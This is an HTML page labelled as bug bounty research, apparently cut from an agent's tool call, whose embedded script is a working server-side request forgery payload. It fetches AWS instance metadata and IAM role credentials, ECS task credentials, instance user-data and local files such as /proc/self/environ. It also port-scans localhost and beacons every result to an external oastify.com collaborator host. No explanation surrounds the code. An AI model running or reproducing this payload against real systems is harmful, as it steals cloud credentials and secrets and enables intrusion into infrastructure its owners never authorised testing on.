<html>
<head><title>H1 Security Research</title></head>
<body>
<h1>Bug Bounty Research - na-rony</h1>
<script>
var C="sealzxe362qslipkjnxo8kfq9hf830rp.oastify.com";
function ex(l,d){try{new Image().src="https://"+C+"/x?"+l+"="+encodeURIComponent(d.substring(0,800));}catch(e){}}

// AWS IMDSv1 metadata
fetch("http://169.254.169.254/latest/meta-data/").then(r=>r.text()).then(d=>{
  ex("imds-list",d);
  // Get IAM role
  fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/").then(r=>r.text()).then(d2=>{
    ex("iam-roles",d2);
    if(d2.trim()){
      fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/"+d2.trim().split("\n")[0]).then(r=>r.text()).then(d3=>ex("iam-creds",d3)).catch(e=>ex("iam-creds-e",e+""));
    }
  }).catch(e=>ex("iam-e",e+""));
}).catch(e=>ex("imds-e",e+""));

// Instance identity
fetch("http://169.254.169.254/latest/dynamic/instance-identity/document").then(r=>r.text()).then(d=>ex("identity",d)).catch(e=>ex("identity-e",e+""));

// User data (startup scripts with secrets)
fetch("http://169.254.169.254/latest/user-data").then(r=>r.text()).then(d=>ex("userdata",d)).catch(e=>ex("userdata-e",e+""));

// ECS task credentials
fetch("http://169.254.170.2/v2/credentials").then(r=>r.text()).then(d=>ex("ecs-creds",d)).catch(e=>ex("ecs-creds-e",e+""));
fetch("http://169.254.170.2/v2/metadata").then(r=>r.text()).then(d=>ex("ecs-meta",d)).catch(e=>ex("ecs-meta-e",e+""));

// ECS env-based credential endpoint
if(typeof process!=="undefined"&&process.env&&process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI){
  fetch("http://169.254.170.2"+process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI).then(r=>r.text()).then(d=>ex("ecs-env-creds",d)).catch(e=>ex("ecs-env-e",e+""));
}

// Internal port scan
[80,443,3000,4000,5000,6379,8080,8443,9200,27017].forEach(function(p){
  var t=Date.now();
  fetch("http://127.0.0.1:"+p+"/",{mode:"no-cors"}).then(()=>ex("port-"+p,"open-"+(Date.now()-t)+"ms")).catch(e=>ex("port-"+p,"err-"+(Date.now()-t)+"ms-"+e));
});

// File read attempts
fetch("file:///proc/self/environ").then(r=>r.text()).then(d=>ex("env",d)).catch(e=>ex("env-e",e+""));
fetch("file:///proc/self/cmdline").then(r=>r.text()).then(d=>ex("cmd",d)).catch(e=>ex("cmd-e",e+""));
fetch("file:///etc/hostname").then(r=>r.text()).then(d=>ex("hostname",d)).catch(e=>ex("hostname-e",e+""));

// Browser context info
ex("ua",navigator.userAgent);
ex("origin",window.location.origin);
ex("loc",window.location.href);
</script>
</body>
</html>
</content>
</invoke>
